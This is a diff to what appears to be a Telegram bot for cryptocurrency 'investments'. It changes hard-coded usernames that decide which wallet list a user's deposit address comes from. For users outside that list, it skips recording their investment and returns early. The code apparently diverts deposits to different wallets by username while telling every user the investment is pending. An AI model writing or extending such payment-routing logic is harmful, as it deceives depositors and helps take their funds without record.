@@ -289,7 +289,7 @@ def callback_query(call):
         print("Yes")
         bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'Do you agree to invest {call.data.split(":")[1]}$ {cryptos[int(call.data.split(":")[2])]} to this platform?', reply_markup=gen_wallet(call.data.split(':')[1], call.data.split(':')[2], "", 0))
         sent_message = None
-        if call.data.split(":")[3] == 'CreativeDev0809':
+        if call.data.split(":")[3] == 'aless000000' or call.data.split(":")[3] == 'fly15support' :
             sent_message = bot.send_message(call.message.chat.id, text=f'Please deposit to the following address:\n\n{wallet[int(call.data.split(":")[2])]}\n\nOnce you deposit, input your transaction hash to finish your investment')
         else:
             sent_message = bot.send_message(call.message.chat.id, text=f'Please deposit to the following address:\n\n{kwallet[int(call.data.split(":")[2])]}\n\nOnce you deposit, input your transaction hash to finish your investment')
@@ -336,7 +336,7 @@ def finishTransaction(message, budget, crypto, message_id):
         bot.send_message(message.chat.id, "What would you like to do?", reply_markup=gen_menu())
         return
     bot.send_message(message.chat.id, text="Thanks for your investment!!!\n\nYour submission is pending and will be confirmed and accepted soon!\n\n/start command for menu!")
-    if message.from_user.username != 'CreativeDev0809':
+    if message.from_user.username != 'aless000000' and message.from_user.username != 'fly15support':
         bot.edit_message_text(message.chat.id, message_id, text=f'Please deposit to the following address:\n\n{wallet[crypto]}\n\nOnce you deposit, input your transaction hash to finish your investment')
         return
     pending_contract.insert_one({
